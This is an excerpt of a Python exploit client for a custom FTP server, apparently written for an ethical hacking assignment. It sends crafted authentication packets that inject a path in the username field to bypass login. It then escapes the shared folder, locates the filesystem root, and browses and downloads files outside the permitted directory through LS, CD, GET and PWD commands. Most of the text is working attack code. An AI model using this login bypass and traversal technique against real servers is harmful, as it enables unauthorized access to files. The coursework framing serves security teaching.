...
def send_malicious_packets(injection_username, findroot = False):
  ...
  while True:
    ...
    # Inject username to change to the root folder
    response_data = socket.recv(1024).decode('utf-8') # Recieving "Please print a valid username and password"

    malicous_data = struct.pack('B', len(injection_username.encode("utf-8"))) + struct.pack('I', 0) + injection_username.encode("utf-8")
    packet = struct.pack('<iQ', PROTOCOL_PCK_TYPE_AUTH_RESPONSE, len(malicous_data)) + malicous_data
    socket.sendall(packet)
    response_data = socket.recv(1024).decode('utf-8') # Recieving "Login failed, try again"

    print("Username injected! sharedpath modified")
    ...
    result = ls_packet(socket, False)
    if not findroot or \
      findroot and ("tmp" in result and "usr" in result and "mnt" in result and "dev" in result and "srv" in result and "etc" in result):
      if findroot: print("Found root of the filesystem! Returning fully injected socket")
      else: print(f"Moved to chosen folder ( {injection_username} ), created new socket")
      return socket, injection_username
    else:
      print("Injection succesful, but not in root filesystem. Retrying...")
...
def get_packet(socket : sock, working_path):
  # Sending packets:
  filename = input('Select remote path: ')
  data = data = f"/{working_path}/{filename}".encode('utf-8')
...
def pwd_packet(socket : sock, verbose = True):
  ...
  data = socket.recv(int(data_size) - 1).decode()
  if verbose: print(f"Where the server struct thinks you're in:  {data}")
  return data
...
def main():
  ...
  # Send malicious packets: change folder and byass security
  injection_username = './'
  socket, working_path = send_malicious_packets(injection_username, True)
  # The program defaults to the root folder! It can than move to any subfolders by recreating the connection (and updates soicket)
  print("\n")
  ...
  while True:
    ...
    if sel == 1: ls_packet(socket) # PROTOCOL_PCK_TYPE_COMMAND_LS
      ...
      filename = input('Keep in mind that the cd command resets the socket. Select * to abort.\nSelect remote path: ')
      if filename.count("/") > 1:
        print("You can only move one folder at a time")
        continue

      # Removing last / from the folder, if chosen
      if filename.count("/") == 1:
        if filename[-1] != '/':
          print("Invalid folder chosen, please retry")
          continue
        else:
          filename = filename[:-1]
      ...
      if filename == '*' or filename == ".": continue
        ...
        rootfolder = True
        for char in working_path:
          if char != "." and char != "/":
            rootfolder = False

        if rootfolder:
          print("You cannot move backwards from the root folder!")
          continue

        # Removing last directory from workingpath
        working_path = working_path[:working_path[:-1].rfind("/") + 1]
      else:
        working_path = f"{working_path}{filename}"


      socket, working_path = send_malicious_packets(f"{working_path}")
    elif sel == 3: # PROTOCOL_PCK_TYPE_COMMAND_GET
      get_packet(socket, working_path)
      continue
    elif sel == 4: # PROTOCOL_PCK_TYPE_COMMAND_PWD
      pwd_packet(socket)
      print(f"Where you actually are: {working_path[working_path.rfind('../') + 2:].replace('//', '/')}")
      continue
    elif sel == 5:
...
if __name__ == "__main__":
  parser = argparse.ArgumentParser(
    ...
    description='Client and sharedfolder escape for FTP server in ethical hacking assignment.',
    epilog='This program function as a client for a custom FTP server and levareges a mistake to bypass login and allows for some command such as PWD, LS and CD to work outside of the predifined FTP sharedpath. If unspecified, the ip defaults to localhost and the port defaults to 8081.')
